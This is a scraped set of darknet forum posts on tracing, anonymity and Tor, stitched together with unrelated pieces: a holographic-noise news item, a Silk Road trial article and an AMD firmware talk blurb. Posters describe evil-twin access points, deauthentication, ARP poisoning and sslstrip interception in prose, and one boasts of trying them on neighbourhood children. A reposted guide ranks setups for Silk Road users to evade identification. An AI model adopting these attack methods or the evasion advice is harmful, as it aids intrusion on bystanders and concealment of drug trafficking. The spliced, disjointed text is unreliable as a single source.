As a consolation prize, it may instead have uncovered the ultimate nature of reality.In 2008, physicist Craig Hogan at the Fermi National Accelerator Laboratory in Batavia, Illinois, was trying to work out how we might test the idea that everything we see as physical reality is the result of a kind of projection from the boundary of the universe. This is known as the holographic principle.The information held at the boundary is not smooth, but composed of ""bits"", each one occupying an area that corresponds to the most fundamental quanta of distance in the universe. This is the Planck length, around 10-35 metres  far too small for us to see the individual bits. When this information is projected into the volume of the universe, however, each bit gets magnified. That means we might just be able to see pixellation in space-time.The kinds of scales involved still mean it would only be detectable in the most sensitive instruments we have  such as the gravitational wave detectors looking for the ripples in space-time caused by violent cosmological events such as the collision of two black holes. Hogan worked out how the pixellation might manifest itself for GEO600 and sent his result to the researchers there.By strange coincidence, the GEO600 team had been having problems with ""noise"" in their detectors. But here's the kicker: the noise had uncannily similar characteristics as Hogan's anticipated signal. Is it indeed the result of information that resides at the edge of the universe? ""The issue is still unresolved,"" says Karsten Danzmann, principal investigator for GEO600. ""The noise is still there and we have no explanation.""The answer may only come after the instrument is upgraded to make it even more sensitive, a step that is due to be completed this time next year."

I will generally be busy, so please don't expect very oft-time posting, here, sorry.  paracelsus, very well-put. I've said the same when the OP posted on Evo a while ago. There are mechanisms on pentesting distros such as Kali, where you can setup honeypot Access Points, such as FakeAP and EvilAP. And besides, if you can, which you of course, can, backdoor the person's computer via LAN connection, and so on.  so all in all, yes you can be tracked.  I'll cross-post:  ","since you're connecting from your location to another wifi which may or may not be a FakeAP, then yes.... not first and last name, but they can trace where it's coming from.....they have a device name, they have macaddr, etc. You've never heard of a honeypot FakeAP have you? It's a virtually-capsuled wifi spot which has a weak or has no password. They collect data from there.What defines ""high target"" is the more legitimately appropriate question.They can also ARP poison you through the LAN, causing you to visit a landing page via redirect, with an exploit. It's been done before. Have you also never heard of LANspy? You can distribute malware through a network. Heck you can shut down computers that are in the same workgroup. Imagine what they can do if you're hooked into their wifi, doesn't matter whether you use stealth mode or not, it still is possible. Try testing tools that do this in Kali Linux, you'll find a buttload. It's not retarded, it's common sense, no offense. what about intercepting messages and traffic via dsniff? These are not new holes, they're beyond old. ARP spoof was a vulnerability characterized in the 1980s. Sniffing traffic through the same LAN network is as old as dirt itself. It's not even complicated. It's not JUST possible, it's already built upon established evidence followed by tools that make it work, everyday in the field. You're wrong to think they can't trace you. Read up on pentesting tools, you'll find more than you'd've thought. There's more to it than Plasma RAT and LOIC. There's real-life threats which CAN and ARE used to trace data streams to their source vs destination. If anyone can download the Kali pentesting distro with all of these tools built-in for free, imagine what LE has. It's all too real. Please do research......as for beaver, you're wrong, at least in how you explained your theory - SDR handles software-driven radio frequency. RFID is hardware-driven radio frequency tech. It has nothing to do with the macaddr.And responding to another person, VPN isn't the best if it's fed-owned or run inside of a server serviced by an ISP that keeps logs. The real IP can also be tracked by mechanisms like CIPAV, which would mean the next time you disconnect your VPN [and think, boot-up, shut-down], which makes it open, even if for a short period of time, to phone the IP address home to DC. Proxies only work if you disable javascript, including Tor. If you're just connecting to an AP or wifi router, you still show off that you're using tor, and that creates a red flag. It won't, of course, in normal circumstances, lead to interception of traffic, since, even tor-tunneled traffic bypasses ARP spoof attacks and blocks any infiltration into the tunnel itself, but if a fed owns the node you happened to be assigned by the client, then they essentially own all your traffic. While that's mostly rare, it's still possible, and does happen. You are, however, very correct with MiTM attacks. Anyone can intercept traffic by issuing a rogue ssl cert to the host being spied upon, it's even easy for anyone with a computer and internet access, just use sslstrip, it's a tool that will intercept ssl traffic through said means. Feds in U.S. did it with google and bing and yahoo, France did with google, Turkey did it for gmail. If you have the cert authorizing you to see all their ssl traffic, not even HTTPS secure connections such as forms with sensitive data is safe, in theory.Funnytrips, macaddr doesn't give anyone a who's whom. It identifies the manufacturer's ID of your NIC card, which, yes, CAN be an incriminating factor, as the rest of a potential investigation pans out and narrows down, but it won't tell who's whom. At most, it'll probably tell you which computer in the neighborhood/household, assuming enough variety in models of NIC cards.and yes I know because I am a grayhat ideologist who studies computer-forensics, malware, backdoors, and methods used, as well as pentesting, etc. I see enough of all of this stuff everyday out there. I know what I'm talking about. I've even used these methods first-hand for testing [think random neighbor kids as test subjects]. I know how they work."
"The Hub Forums","paracelsus","5058.0","2014-09-30T22:22:31","If you were a high level target and used hacked wifi, how would they trace you?","General Discussion/Security","^ That said, but there's nothing like spending some time with Kali Linux pentesting to know precisely how these attacks are performed. I learned a lot from my younger days pulling this shit, and that's why I'm ultra paranoid. It's kinda like how Freud said -- the paranoid schizophrenic is paranoid people are out to get them because it;s THEY who are secretly harboring sinister intent towards people.  To add to canahontra's points:   An Evil Twin access point could have the same name and MAC address of the AP you're connected to. Then it's all a matter of sending deauthentication packets to all the clients on the AP, and all of a sudden, you've unwittingly connected to the Evil Twin... And know all those times you've connected to an open wifi access point on your device? Your wifi sends out probe requests for these APs; it's just a matter of creating an AP using a nice Alfa wifi adapter with the same name and MAC and all of a sudden you may find yourself connecting to this AP without even knowing. Classic tell-tale sign is seeing an AP in your vicinity, say Starbucks Wifi in an area where there is no wifi.  I need to correct something I said earlier -- apparently there's a new implemetation of SSLstrip that can beat HSTS, which could render HTTPS everywhere more vulnerable than what is typically thought.  And this is just shit I slowly taught myself over a short period of time. So much shit to be mindful of that it may indeed be prudent to reconsider your life choice of becoming a high level target to begin with         ",""

This isn't exhaustive and I'm sure others will be able to add additional methods:  Suppose they found out the real-world IP address of the access point to which you're connecting. Very difficult, but let's say you were worth the investment in resources. To those who say Tor is 100% secure, and interesting article on this topic is here:  https://grugq.github.io/blog/2013/06/14/you-cant-get-there-from-here/ Essentially, if you were a sufficiently high value, the amount of resources required to catch you is well within the means of a powerful adversary such as the NSA.   Anyway, LE could then create a rogue access point, to which you might connect unknowingly and perform a MITM attack. They could do a few things including DNS poisoning, wherein you're unknowingly redirected to a phishing page, allowing them to collect more information about you. You might be directed to update your browser, and unknowingly install an exploit.  MAC addresses can be spoofed, but in some instances, they can leak the real MAC address. ( http://skeletonkeysecurity.com/post/66833983157/some-atheros-drivers-can-leak-actual-mac-addresses-when). If you didn't pay with cash, your real-world identity would then be compromised. Alternatively, they might attempt to identify the unique radio fingerprint of the wifi antenna, meaning regardless of the MAC address, they could still identify its unique fingerprint.   No antenna has a range of 8 miles but I'll humor you. Like mobile phones, geolocation with wifi can be done. One method is to monitor for antenna probe requests and signal strength.Given your distance, this might take some time but is certainly possible. Once determining your general location, they could then request a cell tower dump to identify all cell phones in the point of interest. They've now narrowed the pool of potential targets. If they had multiple dates and times where they knew you were active, and for each and every tower dump your cell phone showed up in the vicinity, there is now good reason to suspect that you have some involvement.   Check out:  moocherhunter.securitystartshere.org for a setup to track wifi thieves. Here's a paper that talks about linking people together based on their associations with other devices:  http://hal.inria.fr/docs/00/81/63/74/PDF/wifi_fingerprint_linking.pdf   Moral of the story: Try to avoid becoming a high-value target by either not piquing the interest of a powerful adversary, or ensure that your actions are perceived to be independent from one another, fomenting the belief that no high-value target even exists. Either that, or avoid breaking the law -- aside from being immoral, breaking the law is... well, illegal          No, there are still problems with mobile phones. Aside from triangulation, cell towers can identify the radio fingerprint of the phone, meaning even if you flashed a new IMEI and used a different SIM card, they could still identify the device: http://www.newscientist.com/article/dn23973-any-cellphone-can-be-traced-by-its-digital-fingerprint.html  My point: it may make the job of LE harder, but it isn't 100% secure.","Say you bought an antenna that could find wifi networks from up to 8 miles away and you hacked a network and used that. How would they be able to track you? ;you should consider using an anonymous prepaid sim card and surf through UMTS. Similar effect but without the stress of hacking wifis (which is easier said than done in most cases) and setting up huge antennas."

"The Hub Forums","r0bertden1ro","6094.0","2014-12-17T05:03:43","Let's talk about security","General Discussion/Security","The following is a post from astor on the SRF1 from August of 2013, shortly after the Freedom Hosting takedown. Still one of the best comparative analyses available on basic security setups for operating on the darknet. I feel the current active community could benefit from an active discussion around these points.  ___________________________________________________ source: SRF1, astor: 14-08-2013       In the wake of the Freedom Hosting exploit, I think we should reevaluate our threat model and update our security to better protect ourselves against the real threats that we face. So I wrote this guide in order to spark a conversation. It is by no means comprehensive. I only focus on technical security. Perhaps others can address shipping and financial security. I welcome feedback and would like these ideas to be critiqued and expanded.       As I was thinking about writing this guide, I decided to take a step back and ask a basic question: what are our goals? I've come up with two basic goals that we want to achieve with our technical security.      1. Avoid being identified.     2. Minimize the damage when we are identified.      You can think of these as our _guiding security principles_. If you have a technical security question, you may be able to arrive at an answer by asking yourself these questions:      1. Does using this technology increase or decrease the chances that I will be identified?     2. Does using this technology increase or decrease the damage (eg, the evidence that can be used against me) when I am identified?      Obviously, you will need to understand the underlying technology to answer these questions.      The rest of this guide explains the broad technological features that decrease the chances we are identified and that minimize the damage when we are identified. Towards the end I list specific technologies and evaluate them based on these features.      First, let me list the broad features that I have come up with, then I will explain them.      1. Simplicity     2. Trustworthiness     3. Minimal execution of untrusted code     4. Isolation     5. Encryption      To some extent, we've been focusing on the wrong things. I've predominantly been concerned with network layer attacks, or ""attacks on the Tor network"", but it seems clear to me now that application layer attacks are far more likely to identify us. The applications that we run over Tor are a much bigger attack surface than Tor itself. We can minimize our chances of being identified by securing the applications that we run over Tor. This observation informs the first four features that we desire.       ===Simplicity===      Short of not using computers at all, we can minimize threats against us by simplifying the technological tools that we use. A smaller code base is less likely to have bugs, including deanonymizing vulnerabilities. A simpler application is less likely to behave in unexpected and unwanted ways.      As an example, when the Tor Project evaluated the traces left behind by the browser bundle, they found 4 traces on Debian Squeeze, which uses the Gnome 2 desktop environment, and 25 traces on Windows 7. It's clear that Windows 7 is more complex and behaves in more unexpected ways than Gnome 2. Through its complexity alone, Windows 7 increases your attack surface, exposing  you to more potential threats. (Although there are other ways that Windows 7 makes you more vulnerable, too.) The traces left behind on Gnome 2 are easier to prevent than the traces left behind on Windows 7, so at least with regard to this specific threat, Gnome 2 is desirable over Windows 7.      So, when evaluating a new technological tool for simplicity, ask yourself these questions:      Is it more or less complex than the tool I'm currently using?     Does it perform more or fewer (unnecessary) functions than the tool I'm currently using?       ===Trustworthiness===      We should favor technologies that are built by professionals or people with many years of experience rather than newbs. A glaring example of this is CryptoCat, which was developed by a well-intentioned hobbyist programmer, and has suffered severe criticism because of the many vulnerabilities that have been discovered.      We should favor technologies that are open source, have a large user base, and a long history of use, because they will be more thoroughly reviewed.      When evaluating a new technological tool for trustworthiness, ask yourself these questions:      Who wrote or built this tool?     How much experience do they have?     Is it open source, and how big is the community of users, reviewers, and contributors?       ===Minimal Execution of Untrusted Code===      The first two features assume the code is trusted but has potential unwanted problems. This feature assumes that as part of our routine activities, we may have to run arbitrary untrusted code. This is code that we can't evaluate in advance. The main place this happens is in the browser, through plug-ins and scripts.      You should completely avoid running untrusted code, if possible. Ask yourself these questions:      Are the features that it provides absolutely necessary?     Are there alternatives that provide these features without requiring plug-ins or scripts?       ===Isolation===      Isolation is the separation of technological components with barriers. It minimizes the damage incurred by exploits, so if one component is exploited, other components are still protected. It may be your last line of defense against application layer exploits.      The two types of isolation are physical (or hardware based) and virtual (or software based). Physical isolation is more secure than virtual isolation, because software based barriers can themselves be exploited by malicious code. We should prefer physical isolation over virtual isolation over no isolation.      When evaluating virtual isolation tools, ask yourself the same questions about simplicity and trustworthiness. Does this virtualization technology perform unnecessary functions (like providing a shared clipboard)? How long has it been in development, and how thoroughly has it been reviewed? How many exploits have been found?       ===Encryption==      Encryption is one of two defenses we have to minimize the damage when we are identified. The more encryption you use, the better off you are. In an ideal world, all of your storage media would be encrypted, along with every email and PM that you send. The reason for this is because, when some emails are encrypted but others are not, an attacker can easily identify the interesting emails. He can learn who the interesting parties are that you communicate with because those will be the ones you send encrypted emails to (this is called metadata leakage). Interesting messages are lost in the noise when everything is encrypted.      The same goes for storage media encryption. If you store an encrypted file on an unencrypted hard drive, an adversary can trivially determine that all the good stuff is in that small file. But when you use full disk encryption, you have more plausible deniability as to whether the drive contains data that would be interesting to that adversary, because there are more reasons to encrypt an entire hard drive than a single file. Also, an adversary who bypasses your encryption would have to cull through more data to find the the stuff that is interesting to him.      Unfortunately, using encryption incurs a cost that the vast majority of people can't bare, so at a minimum, sensitive information should be encrypted.      On a related note, the other defense against damage is secure data erasure, but that takes time that you may not have. Encryption is preemptive secure data erasure. It's easier to destroy encrypted data, because you only have to destroy the encryption key to prevent an adversary from accessing the data.      Finally, I'd like to add a related non-technical feature.      ===Safe Behavior===      In some cases, the technology we use is only as safe as our behavior. Encryption is useless if your password is ""password"". Tor is useless if you tell someone your name. It may surprise you how little an adversary needs to know about you in order to uniquely identify you. Here are some basic rules to follow:      Don't tell anyone your name. (obv)     Don't describe your appearance, or the appearance of any major possessions (car, house, etc.).     Don't describe your family and friends.     Don't tell anyone your location beyond a broad geographical area.     Don't tell people where you will be traveling in advance (this includes festivals!).     Don't reveal specific times and places where you lived or visited in the past.     Don't discuss specific arrests, detentions, discharges, etc.     Don't talk about your school, job, military service, or any organizations with official memberships.     Don't talk about hospital visits.      In general, don't talk about anything that links you to an official record of your identity.       ===A List of Somewhat Secure Setups for Silk Road Users===      I should begin by pointing out that the features outlined above are not equally important. Physical isolation is probably the most useful and can protect you even when you run complex and untrusted code. In each of the setups below, I assume a fully updated browser / TBB with scripts and plug-ins disabled. Also, the term ""membership concealment"" means that someone watching your internet connection doesn't know you are using Tor. This is especially important for vendors. You can use bridges, but I've included extrajurisdictional VPNs as an added layer of security.      With that in mind, here is a descending list of secure setups for SR users.      Starting off, I present to you the most secure setup!      #1      A router with a VPN + an anonymizing middle box running Tor + a computer running Qubes OS.      Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment against local observers with VPN      Disadvantages: Qubes OS has a small user base and is not well tested, as far as I know.      #2      Anon middle box (or router with Tor) + Qubes OS      Advantages: physical isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed      Disadvantages: Qubes OS has a small user base and is not well tested, no membership concealment      #3      VPN router + anon middle box + Linux OS      Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base if it's a major distro like Ubuntu or Debian      Disadvantages: no virtual isolation of applications from each other      #4      Anon middle box (or router with Tor) + Linux OS      Advantages: physical isolation of Tor from applications, full disk encryption, well tested code base      Disadvantages: no virtual isolation of applications from each other, no membership concealment       #5      Qubes OS by itself.      Advantages: virtual isolation of Tor from applications, virtual isolation of applications from each other, encryption as needed, membership concealment (possible? VPN may be run in VM)      Disadvantages: no physical isolation, not well tested      #6      Whonix on Linux host.      Advantages: virtual isolation of Tor from applications, full disk encryption (possible), membership concealment (possible, VPN can be run on host)      Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested      #7      Tails      Advantages: encryption and leaves no trace behind, system level exploits are erased after reboot, relatively well tested      Disadvantages: no physical isolation, no virtual isolation, no membership concealment, no persistent entry guards! (but can manually set bridges)      #8      Whonix on Windows host.      Advantages: virtual isolation, encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation of applications from each other, not well tested, VMs are exposed to Windows malware!      #9      Linux OS      Advantages: full disk encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation      #10      Windows OS      Advantages: full disk encryption (possible), membership concealment (possible)      Disadvantages: no physical isolation, no virtual isolation, the biggest target of malware and exploits!       Assuming there is general agreement about the order of this list, our goal is to configure our personal setups to be as high up on the list as possible.      Thanks for your attention, and again I welcome comments and criticism.

When I say they can't crack it, that is based on the presumption that the passphrase is long enough. Let me explain....There are 7776 words in the Diceware wordlist. If you used just one word, they would have to try 7776 words in the list. If you tried two words, they would have to try 7776 x 7776 = 60,466,176 combinationsIf you used three words, they would have to try 7776 x 7776 x 7776  = 470,184,984,576 combinationsBy the time you reach six words, they would have to try: 2.21073919721x10^23 combinations.

Since there are 31,557,600 seconds in a year, therefore 221,073,919,721 seconds works out to 7,005 years. A five word Diceware passphrase would take a maximum of about 10 months to brute-force. Typically, passwords/passphrases are found after searching about half the entire keyspace. So, in the above example, we would expect that such a search would take about 3,500 years. So, in the second example, we can assume that a 5 word Diceware passphrase can be exhaustively searched / brute-forced in about 5-6 months. It's always better to add a couple of extra words, thus my recommendation to use 8-10 words. (If you're really paranoid, use 12.)Using the above calculations, a 10 word Diceware passphrase would take 2.56128880987x10^19 years to exhaustively search / brute-force.  8.08281277465x10^38 combinations / 1 x 10^12 combinations/second = 8.08281277465x10^26 seconds / 31,557,600 seconds/year = 2.56128880987x10^19 years.

In a new legal brief (PDF)[3], Microsoft says, ""For an argument that purports to rest on the 'explicit text of the statute,' the Government rewrites an awful lot of it. Congress never intended to reach, nor even anticipated, private communications stored in a foreign country when it enacted [the ECPA][4]."" In an accompanying blog post, Microsoft general counsel Brad Smith wrote, ""Until U.S. law is rewritten, we believe that the court in our case should honor well-established precedents that limit the government's reach from extending beyond U.S. borders.[5] ... To the contrary, it is clear Congress's intent was to ensure that your digital information is afforded the same legal protections as your physical documents and correspondence, a principle we at Microsoft believe should be preserved.""Clearnet Links: [1] http://thehill.com/policy/technology/238352-microsoft-claims-feds-rewriting-law[2] http://yro.slashdot.org/story/14/08/30/220255/microsoft-defies-court-order-will-not-give-emails-to-us-government[3] https://mscorp.blob.core.windows.net/mscorpmedia/2015/04/Microsoft-Reply-Brief.pdf[4] http://en.wikipedia.org/wiki/Electronic_Communications_Privacy_Act[5] http://blogs.microsoft.com/on-the-issues/2015/04/09/our-legal-challenge-to-a-us-government-search-warrant/Source URL: http://yro.slashdot.org/story/15/04/10/1845221/microsoft-feds-are-rewriting-the-law-to-obtain-emails-overseas"

Because using PGP implies you have something you want to hide from authorities and of course LE wants anything but privacy.  Lots of people I know, know very vaguely about Linux but I don't have a friend that knows of BSD Unices as they are a very old Unix OS.","Quote from: flashy on April 22, 2015, 10:12:29 amThese nasty corporations are afraid people will finally wake up and stop using their nasty products I amnot convinced they have any other motiveI have to disagree with you on that.  Microsoft and Google aren't afraid that people will stop using their products and services -- I think they both realize that, by and large, they have a captive market. The vast majority of people, even on the Darknet, are using Windows -- if for no other reason that they haven't got the skills to use anything else. People with a certain degree of skill can use Linux, even run their own mailserver, but they cannot code their own search engine(s). When it comes to operating systems, most people opt for Windows (Microsoft) or Android (Google). (I'm ignoring OS X and iOS because you have to buy Apple hardware to be able to use these.) For email, there's Gmail and Outlook.com (or whatever MS is calling it these days.) For search engines, you've got Google or Bing. Most people haven't heard of Duck Duck Go, or Startpage; many have not heard of Linux, much less the BSD Unices. Excellent alternatives have been available for quite some time now, yet the uptake on these is miniscule. The basic reason is user ignorance and/or sloth, which also happens to be the main obstacle toward the adoption of encryption, e.g. PGP.Zaphod"

There is a nice solution other than VPN services (which can prove to not be helpful depending on how you configure your pathway into tor or if you choose a bad vpn service) called pluggable transports that give you a 'bridge' to connect to tor.   bridge - ip address that connects you to tor, possibly unknown as a tor bridge. using these will hide that you are using a KNOWN tor node.   obfs2 bridge - bridge that has data packets disguised as normal data, hides on the surface that you are using tor. vulnerable to DPI, (deep packet inspection) a capability of the FBI or NSA.  roughly 200-300 exist so understand using them can pool you into a smaller group. Solution: Host your own on a VPS or the Tor Cloud service  obfs3 - resistent to DPI, ultimately the safest bridge as it completely masks your data packets. The only problem is that they are few in number thus pooling you into yet a smaller group. The more people host, the infinitely stronger tor becomes!!  SO, go to torproject and look up some bridges, obfs2 and obfs3 bridges, the more you have the better.  SO NOW BOOT TAILS IN BRIDGE MODE. wait til the menu for live or live(failsafe) comes up. hit Tab, and then hit spacebar and enter the word bridge, which will launch tails in bridge mode.  from here, set the system clock to sync with UTC (UK) time.   The menu for adding bridges will open automatically, with an attached 127:0.0.1: 7777 or some other number, do not delete this as it is necessary for bridge mode to run.   add your bridges one at a time and hit the + button,  connect to tor a bit more safely!    TAILS is working on implenting support for flashproxy, the next HUGE tool in tor anynomity. once that is deployed for TAILS i would heavily consider implementing that technology. There is a special pluggable transports TOR browser bundle that is configured to run bridges automatically; which supports flashproxy so it is a matter of time.   THE TOR CLOUD SERVICE IS A GREAT WAY TO HOST A FREE PRIVATE OBFS2/3 BRIDGE. IF YOU WANT TO STRENGTHEN TOR THINK ABOUT HOSTING A PUBLIC BRIDGE OR OBFS BRIDGE!  BE SAFE LOVIES. <3 SpAcEh0rSe",""

A jury found Ross Ulbricht guilty on all seven charges, including money laundering, drug trafficking, and the ""kingpin"" charge. That's not just bad news for Ulbricht, who faces life in prison. His trial could help establish a dangerous precedent, which could allow law enforcement to gather evidence illegally.  While many watching the trial were fascinated by all the ways that Ulbricht's identity was definitively linked to the pseudonymous digital drug bazaar runner Dread Pirate Roberts, they overlooked something crucial. The FBI never had to explain how it located and infiltrated the Silk Road's hidden servers. The fact that the evidence law enforcement provided from those servers was admitted despite the lack of clarity about their sources is troubling.  Privacy advocates suspect the government's search and seizure was not entirely above board, arguing the agency hacked into the anonymous site without a warrant. As Adam Clark Estes wrote shortly before the trial:      Both sides are clashing over one specific detail regarding how the FBI located the hidden Silk Road server. Put simply, they hacked the site's login page with a (potentially illegal) brute force attack. Or the NSA did it for themâthat part's a little bit unclear. Neither of the government agencies had a warrant, of course.      The defense says that this sort of intrusion represents a clear violation of the Fourth Amendment. Just imagine if the FBI had broken into and searched Ulbricht's house instead of his server.  That's a reasonable concern, though it didn't do the defense any good in court. Judge Katherine Forrest rejected the argument on a technicality during the trial, and so the defense was not allowed to explore this line of questioning. Without a clear answer, there's no proof that the government obtained the information legally.  The defense instead tried to run with the argument that the FBI had initially suspected someone else of running the Silk Road, Mt. Gox CEO Mark Karpeles. But the prosecution shut down this line of questioning, and the defense was pretty much screwed. The prosecution had obtained a damning pile of evidence, from Ulbricht's diaries to a report tracing $13.4 million Bitcoin from the Silk Road into Ulbricht's personal digital wallet. While defense lawyer Robert Dratel kept arguing about the slipperiness of digital identity, it wasn't enough to sway the jury.  What's at stake here is a lot more than Ulbricht's innocence or guilt. This trial set precedents that will affect future defendants, too. The fact is that law enforcement was allowed to present damning digital evidence without explaining where it came from. That's bad news for our civil liberties. It means that police and other law enforcement officers working digital crime cases may not have to worry as much about obeying the law anymore when it comes to gathering evidence. Corruption would surely follow.  Before the verdict came in, I talked to Ryan E. Long, a lawyer affiliated with Stanford's Center on Internet and Society, about the potential impact of this case on future internet-related trials. He zeroed in on the importance of authenticating the evidence that the government showed, and making sure it was obtained without violating the Constitution.  ""How did they get this information, and did they breach the law by getting it? I think that will set the precedent with future electronic cases about how the government got the information and whether they did it legally,"" he said. The issue is, he continued, ""whether the government obtained the evidence that they wish to use to prove this narrative, [Ulbricht's guilt] such as the identity of the server, in a lawful way consistent with the Fourth Amendment, among other things.""  That doesn't mean Ulbricht did not do the things he's now convicted of doing. It doesn't mean the Silk Road kingpin doesn't belong behind bars. But it does mean, unambiguously, that the feds were allowed to present evidence that may have been obtained unlawfully. In the legal world, there's a metaphor called ""fruit of the poisonous tree."" It's used to describe tainted evidence, evidence that comes from breaking the law.  It's not supposed to be admissible in court. But now, thanks to the Silk Road verdict, there's precedent that lawyers can cite to avoid having to explain how they their clients acquired make-or-break digital evidence.   ",""

It would appear that Canada is going the same way as the U.S., only perhaps more slowly. The one good thing likely to take place this year is that Harper and his caucus of trained seals will finally be given the boot, although who will wind up as the next Prime Minister is a good question. Trudeau is more of a disappointment by the day -- he is most certainly NOT his father. Mulcair would be a decent Prime Minister, although whether the electorate would elect an NDPer as PM remains to be seen.   I'm so glad that my old man didn't live to see this -- we've constructed much the same type of society that they went over to Europe to fight against so many decades ago. We're all East Germans now.  The only place with any significant pushback in this regard is Germany -- Hitler is still within living memory, although the number of people who directly witnessed the regime are becoming fewer by the day. Chancellor Angela Merkel was raised in East Germany, so she knows first-hand the abuses of that society. That is why there was so much outrage in Germany over her mobile phone being spied upon by the Americans.   It is worthy of note that filmaker Laura Poitras (of CitzenFour fame) and Jake Appelbaum (of the Tor Project) now both make Germany their home. Both of them feel that America is no longer safe for either of them to live and work in. Glenn Greenwald has virtually become a national hero in Brazil for revealing the extent of American (and Canadian) spying on Brazil's government and corporate sector. Although Greenwald has not been hassled to the extent that Appelbaum and Poitras have (although his partner David Miranda has, by the British) I very much doubt that he will ever return to the U.S. to live, either.   It is astonishing how things have inverted in the course of a single human lifetime. I remember reading an account of an elderly man, who was raised in Hitler's Germany -- he escaped to the United States, and thus avoided the Holocaust. Several years ago, he described how he was seeing the very same signs in America that he had seen as a child in Germany. He became so alarmed, that he sold his house, and moved back to Germany from the United States -- a course of action that even a scant two decades ago, would literally have been  unthinkable.

The big fear re: NSA spying is the retroactive search capabilities. Let's say you're driving down the road one day and you accidentally hit a black person with your car. They conduct a search and find you made a semi-racist comment on Facebook years before. Now it's a hate crime. Also, you say you didn't do anything wrong yet but you should encrypt anyway. The encryption algos can't be easily broken now, but in 10 years, they may be able to be broken within minutes. It doesn't matter if you have anything to hide or not, protect yourself.I wasn't thinking in those terms... excellent point! Zaphod"

Either way, if the BIOS is somehow compromised it won't make any difference what you run your OS from.

You definitely should care. The aim of this talk is to provide insight to the security, architecture and yes you guessed it, vulnerability of the AMD System Management Unit (SMU) firmware found in modern AMD x86 processors. Every modern x86 platform contains several other auxiliary processors, which kind of erase the line between pure hardware and software. How well are those processors secured? What is running on them? Is there a way to analyze them? Great attention had the Intel ME engine, but similar, although not so unfriendly processor(s) exists on the AMD platforms too.

The SMU is designed to prevent unauthorized code execution, thus making it ideal candidate to verify if it is so. This is where the fun starts.

"The Hub Forums","Zaphod","7924.0","2015-04-09T19:08:00","How can i setup obfs3 and brdgrd in Tails? Also why is this not the standard?","General Discussion/Security"," Neither will JonDoNym. See below.   See below.    The JonDonym client program allows the user to choose among several Mix  Cascades (i.e. a group of anonymization proxies) offered by independent  organisations. Users may choose by themselves whom of these operators they  will trust, and whom they won't. This is different from peer-to-peer based  anonymity networks like Tor and I2P, whose anonymisation proxies are  anonymous themselves, which means the users have to rely on unknown proxy  operators. However, it means that all the relays used for JonDonym-mediated  connections are known and identified, and therefore potentially targeted  very easily by hackers, governmental agencies or lobbying groups. This has  for example led to the issues mentioned below,  where court orders essentially gave all control over the whole system to the German government.   As discussed below, solutions like international distribution of the relays  and the additional use of Tor can somewhat mitigate this loss of independence.  The speed and availability of the service depends on the operators of the  Mixes in the cascades, and therefore varies. More users on a cascade improve  anonymity, but a large number of users might diminish the speed and bandwidth  available for a single user.   Cost, name change and commercial service  Use of JonDonym has been (and still is) free, but since financial backing of  the original research project ran out on 22 June 2007, a startup, Jondos GmbH,  was founded by members of the original project team. Jondos GmbH has taken  over development and continues to work on an improved blocking resistance  function that would make it easier for users from restrictive countries to  get a connection to the system [citation needed]. To cover costs of running  mix cascades and increase speed as well as anonymity, Jondos and other  Internet firms[who?] launched a commercial version of the anonymizing proxy.  As a consequence, the JAP client has been renamed to JonDo and the service  itself from AN.ON to JonDonym.[6] JonDonym mix cascades are mostly operated  by SMEs in multiple countries and mix cascades always include three mix  servers for advanced security. As contractors of Jondos GmbH must ensure  sufficient throughput of their mixes, anonymous web browsing at standard DSL  speeds is possible[citation needed]. Cost free Cascades are still in  operation, although they do not offer the low latency, multiple Mixes per  Cascade or guaranteed bandwidth the commercial ones do.   Privacy   The online activities of the user can be revealed if all Mixes of a cascade work together by keeping log files and correlating their logs.[7]  However, all Mix operators have to sign a voluntary commitment not to keep  such logs, and for any observer it is difficult to infiltrate all operators  in a long cascade.   In July 2003, the German BKA[8][9] obtained a warrant to force the Dresden Mix operators to log access to a specific web address, which was hosting child pornography. AN.ON then decided to introduce a crime detection function in the server software in order to make this possible. The  feature was made transparent by publishing the changed source code on August  18, 2003, and subsequently criticized by many users. For the Dresden Mix, the  feature continues to be part of their software until today.  Tracing activities back in the past is still technically not possible for the operators, but anonymity now extends only to the timepoint that a surveillance court order is issued. [10] It was pointed out though that the new feature was  covered by the AN.ON threat model and not a security leak by itself.  As a reaction to the threat from local authorities, the system has spread  internationally. If the Mixes of a cascade are spread over several countries,  the law enforcement agencies of all these countries would have to work  together to reveal someone's identity.[11] AN.ON publishes every year the  number of successful and unsuccessful surveillance court orders.[12] Further  research is being done by AN.ON to make the crime detection functionality  more privacy-friendly.[3]  Since May 2005, JonDonym can also be used as a client for the Tor network  and since 2006 also for the Mixminion network.[13] These features are still  in an early stage and only available in the beta version of the software.

"The Hub Forums","The real Jigsaw Puzzle","7924.0","2015-04-16T08:09:09","How can i setup obfs3 and brdgrd in Tails? Also why is this not the standard?","General Discussion/Security","Tor bridges will help disguise your Tor usage from your ISP so it won't stand out like dogs balls however if you come to the attention of LE and they subsequently take a closer inspection of your internet usage, then Tor bridges won't be of much help at all, if any! Tor bridges over hacked Wi-Fi or even a public Wi-Fi hotspot is you must, will help your cause however staying out of the attention of all LE agencies in the first instance is what you should be aiming to do.  To setup the use of obfs3 Tor bridges in Tails when connecting to the Tor network:-    1. Firstly, in an already open session of Tails, go to  -  https://bridges.torproject.org.   2. Click on Step 2. - Get bridges.  3. Scroll down the page to the Advanced Options. Ensure (Do you need a Pluggable Transport?) is set to obfs3 (it is by default however it's now possible to use obfs4 bridges with Tails if you choose to do so) and then click on Get Bridges just below.  4. Correctly fill out the displayed captcha and hit Enter on your keyboard.  5. If the captcha is correct, you will be given two obfs3 bridges to use. Save them to your encrypted Persistent folder for use when you next boot up Tails.   6. Close your current Tails session and reboot Tails.   7. When the Tails Greeter appears, enter your password to access your Persistent folder. Below in the Welcome to Tails window, click on the Yes button. Then click on the Forward button.  8. On the next page, enter in an Admin password (in case you ever need admin privledges). Then in the Network configuration section below, click on the following option  -   This computer's Internet connection is censored, filtered, or proxied. Then click on the button at the bottom right of screen (I think it says Login but I could be mistaken).  9. Then, after re-starting your session of Tails and connecting to the Internet at the bottom right of screen, an assistant will appear on screen to guide you through the configuration of Tor. Click on the Network Manager Applet (Tails uses different icons depending on if you choose to use the Windows Camouflague option in the Tails Greeter ( https://tails.boum.org/doc/anonymous_internet/networkmanager/index.en.html ). Choose the network you 